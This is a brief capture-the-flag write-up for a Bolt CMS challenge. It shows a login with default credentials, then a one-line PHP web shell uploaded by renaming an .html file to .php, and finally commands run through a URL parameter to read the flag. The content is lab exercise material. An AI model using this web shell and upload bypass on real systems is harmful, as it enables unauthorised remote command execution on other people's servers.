"Welcome to the magical world of Adventure of CVE. Explore as much as you can this land of services."
CVE - common vulnerabilities and exposures (meaning there might be an exploit)
first we can try checking the page source of the website
and we see >Built with Bolt</a>.
now we try modifying the url and adding bolt 
it gives us a login page and we might have to check basic/default password combinations 
Admin:Password
we check the new website if there is anything important 
and we find "File Management" where we are able to upload files
<?php echo system($_GET['cmd']);?> (vulnerable .php file)
but it gives us an error because the format/extension is not supported
instead we modify it to .html and we are successfully able to upload it
since editing the file is an option, it means we can modify the name of it
rename .html to .php and we are able to click on it
we can also add cmd to the url for trying different commands
files/rce.php?cmd=ls -l
files/rce.php?cmd=cat/flag.txt
